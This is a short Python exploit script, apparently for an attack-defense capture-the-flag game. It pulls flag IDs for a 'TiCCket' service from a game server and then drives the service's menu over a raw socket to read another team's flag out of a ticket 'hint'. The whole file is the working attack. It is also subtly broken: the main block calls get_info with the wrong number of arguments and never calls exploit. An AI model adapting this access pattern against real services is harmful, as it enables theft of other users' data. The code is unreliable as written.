from pwn import *
import requests
import json

def get_info(team_id, round_num):
    service = "TiCCket"
    infos = []
    url = f"http://10.10.0.1:8081/flagIds?service={service}&team={team_id}&round={round_num}"
    try:
        r = requests.get(url, timeout=2)
        if r.status_code == 200:
            data = r.json()
            # Navigate into the nested structure
            if service in data:
                entry = data[service].get(str(team_id), {}).get(str(round_num), {})
                if entry:
                    infos.append({
                        "round": round_num,
                        "team": team_id,
                        "ctf_id": entry.get("ctf_id"),
                        "ticket_id": entry.get("ticket_id")
                    })
        else:
            print(f"[!] Got status {r.status_code} for round {round_num}")
    except Exception as e:
        print(f"[!] Error on round {round_num}: {e}")
    return infos

def exploit(ip, ctf_id, ticket_id):
    flag = ""
    r = remote(ip,1337)
    r.recvuntil(b"Exit")
    r.sendline(b"1")
    r.recvuntil(b"CTF ID:")
    r.sendline(str(ctf_id).encode())
    r.recvuntil(b"):")
    r.sendline(b"dsgfhjgfdsghjkgfd")
    r.recvuntil(b"Exit")
    r.sendline(b"1")
    r.recvuntil(b"ID:")
    r.sendline(str(ticket_id).encode())
    r.recvuntil(b"Exit")
    r.sendline(b"3")
    r.recvuntil(b"Index:")
    r.sendline(b"0")
    r.recvuntil(b"Exit")
    r.sendline(b"2")
    r.recvuntil(b"hint: ")
    flag = r.recvuntil(b"=")
    return flag

# Example usage
if __name__ == "__main__":
    ip = "10.10.0.1"
    team_id = 0
    rounds = range(101, 105)  # example range, adjust as needed
    for round in range (0,105):
        results = get_info(ip, team_id, round)
        print(results)
